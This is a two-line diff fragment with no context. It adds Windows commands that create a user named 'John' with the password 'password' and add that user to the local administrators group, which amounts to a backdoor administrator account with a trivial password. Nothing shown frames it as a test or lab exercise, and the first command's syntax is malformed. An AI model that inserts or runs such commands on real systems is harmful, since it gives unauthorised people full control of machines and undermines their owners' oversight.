@@ -1,0 +1,2 @@
+net users /add John key=password
+net localgroup administrators John /add
